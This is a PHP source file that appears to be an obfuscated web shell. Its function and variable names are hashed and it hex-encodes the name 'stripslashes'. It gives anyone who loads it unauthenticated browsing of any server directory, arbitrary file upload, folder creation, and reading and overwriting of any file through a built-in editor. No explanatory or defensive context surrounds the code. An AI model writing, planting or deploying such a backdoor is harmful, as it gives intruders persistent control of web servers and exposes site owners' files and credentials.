<?php
	echo '<!DOCTYPE html>';
	echo '<html lang="en">';
	echo '<head>';
	echo '<meta charset="UTF-8">';
	echo '<meta name="viewport" content="width=device-width, initial-scale=1.0">';
	echo '<title>^^&&^^</title>';
	echo '<style>
		body {
			font-family: Arial, sans-serif;
			margin: 0;
			padding: 0;
		}
		#container {
			max-width: 800px;
			margin: 20px auto;
			padding: 20px;
			border: 1px solid #ccc;
			border-radius: 5px;
			background-color: #f9f9f9;
		}
		h1 {
			text-align: center;
			color: #333;
		}
		h2 {
			margin-top: 30px;
			color: #555;
		}
		ul {
			list-style-type: none;
			padding: 0;
		}
		li {
			margin-bottom: 10px;
		}
		a {
			text-decoration: none;
			color: #007bff;
		}
		a:hover {
			text-decoration: underline;
		}
		form {
			margin-top: 20px;
		}
		input[type="text"], input[type="file"], input[type="submit"] {
			margin-bottom: 10px;
		}
		hr {
			border: 0;
			height: 1px;
			background-color: #ccc;
			margin-top: 20px;
			margin-bottom: 20px;
		}
	</style>';
	echo '</head>';
	echo '<body>';
	echo '<div id="container">';
        function fn_4ba5ea7ff0ed346d0c4319f79731788a($var_db9fed695af7f4f6697160cd32f19751) {
        return htmlspecialchars(strip_tags($var_db9fed695af7f4f6697160cd32f19751));
    }

        function fn_1d8db395bbe11724fbbd405db51c4aff($var_1caf042cdd378af3e1aa1393a069e428) {
        $var_1caf042cdd378af3e1aa1393a069e428 = str_replace('\\','/', $var_1caf042cdd378af3e1aa1393a069e428);
        $var_dbb5a3d7da5908ae633199bfdfdde0e0 = explode('/', $var_1caf042cdd378af3e1aa1393a069e428);
        $var_355ab6e6b83c42c75e9e1fab88350eda = [];

        foreach ($var_dbb5a3d7da5908ae633199bfdfdde0e0 as $var_7b615fec0e17836d1103e9f6224592cb => $var_ba797bf8fae5cb47a0d3a38d8c30cde3) {
            if ($var_ba797bf8fae5cb47a0d3a38d8c30cde3 == '' && $var_7b615fec0e17836d1103e9f6224592cb == 0) {
                $var_355ab6e6b83c42c75e9e1fab88350eda[] = '<a href="?belekmata=/">/</a>';
                continue;
            }
            if ($var_ba797bf8fae5cb47a0d3a38d8c30cde3 == '') continue;
            $var_355ab6e6b83c42c75e9e1fab88350eda[] = '<a href="?belekmata=';
            for ($var_6c346649717c696ada8607ddfd976dc2 = 0; $var_6c346649717c696ada8607ddfd976dc2 <= $var_7b615fec0e17836d1103e9f6224592cb; $var_6c346649717c696ada8607ddfd976dc2++) {
                $var_355ab6e6b83c42c75e9e1fab88350eda[] = "$var_dbb5a3d7da5908ae633199bfdfdde0e0[$var_6c346649717c696ada8607ddfd976dc2]";
                if ($var_6c346649717c696ada8607ddfd976dc2 != $var_7b615fec0e17836d1103e9f6224592cb) $var_355ab6e6b83c42c75e9e1fab88350eda[] = "/";
            }
            $var_355ab6e6b83c42c75e9e1fab88350eda[] = '">'.$var_ba797bf8fae5cb47a0d3a38d8c30cde3.'</a>/';
        }

        return implode('', $var_355ab6e6b83c42c75e9e1fab88350eda);
    }

        function fn_381fc054f5280b2c0c89b4284c8c95b3($var_1caf042cdd378af3e1aa1393a069e428) {
        $var_894c3a485db341a66ac70b599778ae2c = scandir($var_1caf042cdd378af3e1aa1393a069e428);
        $var_e8e6fe2d4c3928e10fff18fcebd90cca = [];
        $var_e669fafef258c693be566b694aabcec9 = [];

        foreach ($var_894c3a485db341a66ac70b599778ae2c as $var_3b643939e87f1a8af2de697e188c5119) {
            if ($var_3b643939e87f1a8af2de697e188c5119 == '.' || $var_3b643939e87f1a8af2de697e188c5119 == '..') continue;
            $var_f30cd20e5a6bf639c4aa77ec7e52bcf6 = $var_1caf042cdd378af3e1aa1393a069e428 . '/' . $var_3b643939e87f1a8af2de697e188c5119;
            if (is_dir($var_f30cd20e5a6bf639c4aa77ec7e52bcf6)) {
                $var_e8e6fe2d4c3928e10fff18fcebd90cca[] = '<li><strong>Folder:</strong> <a href="?belekmata=' . urlencode($var_f30cd20e5a6bf639c4aa77ec7e52bcf6) . '">' . $var_3b643939e87f1a8af2de697e188c5119 . '</a></li>';
            } else {
                $var_d1e4026e0ed50659b5118561823ee38b = filesize($var_f30cd20e5a6bf639c4aa77ec7e52bcf6);                 $var_7420a959c4de44a57425481664692e52 = ['B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB'];
                $var_5c1e6bad443f4a822e04a06096eb54af = $var_d1e4026e0ed50659b5118561823ee38b ? round($var_d1e4026e0ed50659b5118561823ee38b / pow(1024, ($var_6c346649717c696ada8607ddfd976dc2 = floor(log($var_d1e4026e0ed50659b5118561823ee38b, 1024)))), 2) . ' ' . $var_7420a959c4de44a57425481664692e52[$var_6c346649717c696ada8607ddfd976dc2] : '0 B';                 $var_e669fafef258c693be566b694aabcec9[] = '<li><strong>File:</strong> <a href="?action=edit&file=' . urlencode($var_3b643939e87f1a8af2de697e188c5119) . '&belekmata=' . urlencode($var_1caf042cdd378af3e1aa1393a069e428) . '">' . $var_3b643939e87f1a8af2de697e188c5119 . '</a> (' . $var_5c1e6bad443f4a822e04a06096eb54af . ') (Click to edit)</li>';             }
        }

                echo '<ul>';
        echo implode('', $var_e8e6fe2d4c3928e10fff18fcebd90cca);
        if (!empty($var_e8e6fe2d4c3928e10fff18fcebd90cca) && !empty($var_e669fafef258c693be566b694aabcec9)) {
            echo '<hr>';         }
        echo implode('', $var_e669fafef258c693be566b694aabcec9);
        echo '</ul>';
    }

        function fn_966d469c584e0d8e1ae1c46b2fe3337c($var_1caf042cdd378af3e1aa1393a069e428, $var_cfa580c8fd1ffd97d22c9b71dea9cde7) {
        $var_cfa580c8fd1ffd97d22c9b71dea9cde7 = fn_4ba5ea7ff0ed346d0c4319f79731788a($var_cfa580c8fd1ffd97d22c9b71dea9cde7);
        $var_c0147635e656ffc2e0f1fa928e9de94d = $var_1caf042cdd378af3e1aa1393a069e428 . '/' . $var_cfa580c8fd1ffd97d22c9b71dea9cde7;
        if (!file_exists($var_c0147635e656ffc2e0f1fa928e9de94d)) {
            mkdir($var_c0147635e656ffc2e0f1fa928e9de94d);
            echo "Folder '$var_cfa580c8fd1ffd97d22c9b71dea9cde7' created successfully!";
        } else {
            echo "Folder '$var_cfa580c8fd1ffd97d22c9b71dea9cde7' already exists!";
        }
    }

        function fn_d77f1da97a1dde8db4addb671f43c75a($var_1caf042cdd378af3e1aa1393a069e428, $var_90e8a0bc178a20a8670eb209951f1b5c) {
        $var_893218f934e7d35fdae93af8a84d11e3 = $var_1caf042cdd378af3e1aa1393a069e428 . '/';
        $var_77304aa57acdad1779ee74da147af4e9 = $var_893218f934e7d35fdae93af8a84d11e3 . basename($var_90e8a0bc178a20a8670eb209951f1b5c['name']);
        $var_1a4ed4d7853bb4a94952b9a0a4ab5cc3 = 1;

                if (move_uploaded_file($var_90e8a0bc178a20a8670eb209951f1b5c['tmp_name'], $var_77304aa57acdad1779ee74da147af4e9)) {
            echo "File ". htmlspecialchars(basename($var_90e8a0bc178a20a8670eb209951f1b5c['name'])). " uploaded successfully.";
        } else {
            echo "Sorry, there was an error uploading your file.";
        }
    }

        function fn_0df9d8c9f4b4a140598ab3e3413427b5($var_0cf0a224b7584999346f0de25bbdbac7) {
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $var_0debdce0ab93497920fd6ff94f2d01c6 = "\x73\x74\x72\x69\x70\x73\x6c\x61\x73\x68\x65\x73"($_POST['file_content']);
            if (file_put_contents($var_0cf0a224b7584999346f0de25bbdbac7, $var_0debdce0ab93497920fd6ff94f2d01c6) !== false) {
                echo "File saved successfully.";
            } else {
                echo "There was an error while saving the file.";
            }
        }
        $var_0debdce0ab93497920fd6ff94f2d01c6 = file_get_contents($var_0cf0a224b7584999346f0de25bbdbac7);
        echo '<form method="post">';
        echo '<textarea name="file_content" rows="10" cols="50">' . htmlspecialchars($var_0debdce0ab93497920fd6ff94f2d01c6) . '</textarea><br>';
        echo '<input type="submit" value="Save">';
        echo '</form>';
    }

        if (isset($_GET['belekmata'])) {
        $var_1caf042cdd378af3e1aa1393a069e428 = $_GET['belekmata'];
    } else {
        $var_1caf042cdd378af3e1aa1393a069e428 = getcwd();
    }

    if (isset($_GET['action'])) {
        $var_5eef066cf0f0af7d344aa658a6f7d00d = $_GET['action'];
        switch ($var_5eef066cf0f0af7d344aa658a6f7d00d) {
            case 'edit':
                if (isset($_GET['file'])) {
                    $var_7627930d2ca3d69d67459718ffea775a = "\x73\x74\x72\x69\x70\x73\x6c\x61\x73\x68\x65\x73"($_GET['file']);
                    $var_0cf0a224b7584999346f0de25bbdbac7 = $var_1caf042cdd378af3e1aa1393a069e428 . '/' . $var_7627930d2ca3d69d67459718ffea775a;
                    if (file_exists($var_0cf0a224b7584999346f0de25bbdbac7)) {
                        echo '<h2>Edit File: ' . $var_7627930d2ca3d69d67459718ffea775a . '</h2>';
                        fn_0df9d8c9f4b4a140598ab3e3413427b5($var_0cf0a224b7584999346f0de25bbdbac7);
                    } else {
                        echo "File not found.";
                    }
                } else {
                    echo "Invalid file.";
                }
                break;
            default:
                echo "Invalid action.";
        }
    } else {
		echo '<h3>Upload:</h3>';
        echo '<form action="" method="post" enctype="multipart/form-data">';
        echo 'Select file to upload: <input type="file" name="file_to_upload">';
        echo '<input type="submit" name="upload_file" value="Upload File">';
        echo '</form>';
        if(isset($_POST['upload_file'])) {
            fn_d77f1da97a1dde8db4addb671f43c75a($var_1caf042cdd378af3e1aa1393a069e428, $_FILES['file_to_upload']);
        }
        echo "<h2>Directory: " . $var_1caf042cdd378af3e1aa1393a069e428 . "</h2>";
        echo "<p>" . fn_1d8db395bbe11724fbbd405db51c4aff($var_1caf042cdd378af3e1aa1393a069e428) . "</p>";
        echo "<h3>Directory Contents:</h3>";
        fn_381fc054f5280b2c0c89b4284c8c95b3($var_1caf042cdd378af3e1aa1393a069e428);
        echo '<hr>';         echo '<h3>Create New Folder:</h3>';
        echo '<form action="" method="post">';
        echo 'New Folder Name: <input type="text" name="folder_name">';
        echo '<input type="submit" name="create_folder" value="Create Folder">';
        echo '</form>';
    }

        if(isset($_POST['create_folder'])) {
        fn_966d469c584e0d8e1ae1c46b2fe3337c($var_1caf042cdd378af3e1aa1393a069e428, $_POST['folder_name']);
    }

    ?>
</div>
</body>
</html>
